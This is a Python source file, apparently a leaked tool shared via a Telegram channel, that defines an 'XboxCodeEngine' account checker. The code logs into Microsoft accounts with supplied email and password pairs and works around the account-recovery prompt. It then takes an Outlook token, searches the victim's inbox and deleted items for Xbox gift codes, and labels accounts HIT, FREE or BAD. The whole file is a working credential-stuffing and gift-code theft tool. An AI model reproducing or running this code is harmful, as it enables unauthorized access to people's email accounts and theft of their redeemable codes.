import re
import uuid
import requests
from urllib.parse import urlparse, parse_qs

# Leak by @SenseiNoir
# Channel: https://t.me/SenseiFall


class XboxCodeEngine:
    def __init__(self):
        self.timeout = 15

    def _login_and_get_token(self, email, password):
        session = requests.Session()
        session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
        try:
            res = session.get("https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en", timeout=self.timeout)
            text = res.text
            ppft_pat  = r'name=["\']PPFT["\'][^>]*value=["\']([^"\']+)["\']'
            ppft_pat2 = r'value=["\']([^"\']+)["\'][^>]*name=["\']PPFT["\']'
            sft = (re.search(ppft_pat, text) or re.search(ppft_pat2, text)
                   or re.search(r'sFTTag[^"]*?value=\\\"([^\\\"]+)\\\"', text)
                   or re.search(r'value=\\\"(.+?)\\\"', text))
            post = re.search(r'"urlPost":"(.+?)"', text) or re.search(r"urlPost:'(.+?)'", text)
            if not sft or not post:
                return None, None
            url_post = post.group(1)
            ppft = sft.group(1)
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft}
            resp = session.post(url_post, data=data, allow_redirects=True, timeout=self.timeout)
            ms_token = None
            if '#' in resp.url:
                ms_token = parse_qs(urlparse(resp.url).fragment).get('access_token', [None])[0]
            elif 'cancel?mkt=' in resp.text:
                try:
                    ipt = re.search('(?<=\"ipt\" value=\").+?(?=\">)', resp.text).group()
                    pprid = re.search('(?<=\"pprid\" value=\").+?(?=\">)', resp.text).group()
                    uaid = re.search('(?<=\"uaid\" value=\").+?(?=\">)', resp.text).group()
                    post_url2 = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', resp.text).group()
                    ret = session.post(post_url2, data={'ipt': ipt, 'pprid': pprid, 'uaid': uaid}, allow_redirects=True)
                    final_redirect = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group()
                    fin = session.get(final_redirect, allow_redirects=True)
                    ms_token = parse_qs(urlparse(fin.url).fragment).get('access_token', [None])[0]
                except:
                    pass
            if not ms_token:
                return None, None
            return session, ms_token
        except:
            return None, None

    def _extract_xbox_codes(self, text):
        code_pattern = r'[A-Za-z0-9]{5}-[A-Za-z0-9]{5}-[A-Za-z0-9]{5}-[A-Za-z0-9]{5}-[A-Za-z0-9]{5}'
        matches = re.findall(code_pattern, str(text))
        return [m.upper().strip() for m in matches]

    def check_account(self, email, password):
        session, ms_token = self._login_and_get_token(email, password)
        if not session or not ms_token:
            return {"status": "BAD", "email": email, "password": password, "reason": "Login failed"}
        try:
            # Exchange for Outlook access token
            token_resp = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                data={
                    "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                    "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
                    "assertion": ms_token,
                    "scope": "https://outlook.office.com/M365.Access profile openid offline_access"
                },
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=self.timeout
            )
            if token_resp.status_code != 200:
                return {"status": "BAD", "email": email, "password": password, "reason": "Token exchange failed"}
            access_token = token_resp.json().get('access_token')
            if not access_token:
                return {"status": "BAD", "email": email, "password": password, "reason": "No access token"}
            # Search mailbox for Xbox codes
            search_payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}, {"Term": {"DistinguishedFolderName": "DeletedItems"}}]},
                    "From": 0,
                    "Query": {"QueryString": "xbox OR gift OR code OR redeem"},
                    "Size": 50,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}],
                    "EnableTopResults": True,
                    "TopResultsCount": 3
                }],
                "LogicalId": str(uuid.uuid4())
            }
            search_headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Accept": "application/json",
                "Authorization": f"Bearer {access_token}",
                "X-AnchorMailbox": f"CID:{session.cookies.get('MSPCID', '').upper()}",
                "Content-Type": "application/json"
            }
            search_resp = session.post("https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124",
                json=search_payload, headers=search_headers, timeout=self.timeout)
            if search_resp.status_code != 200:
                return {"status": "ERROR", "email": email, "password": password, "reason": "Search failed"}
            data = search_resp.json()
            all_codes = []
            def find_text(obj):
                if isinstance(obj, dict):
                    for k, v in obj.items():
                        if k in ("text", "messageText", "content", "body", "message") and isinstance(v, str):
                            yield v
                        else:
                            yield from find_text(v)
                elif isinstance(obj, list):
                    for item in obj:
                        yield from find_text(item)
            for text in find_text(data):
                all_codes.extend(self._extract_xbox_codes(text))
            unique_codes = list(dict.fromkeys(all_codes))
            if unique_codes:
                return {"status": "HIT", "email": email, "password": password, "data": unique_codes, "codes": unique_codes}
            return {"status": "FREE", "email": email, "password": password, "reason": "No codes found"}
        except Exception as e:
            return {"status": "ERROR", "email": email, "password": password, "reason": str(e)[:50]}

    def get_stats(self):
        return {"total_checked": 0, "total_hits": 0}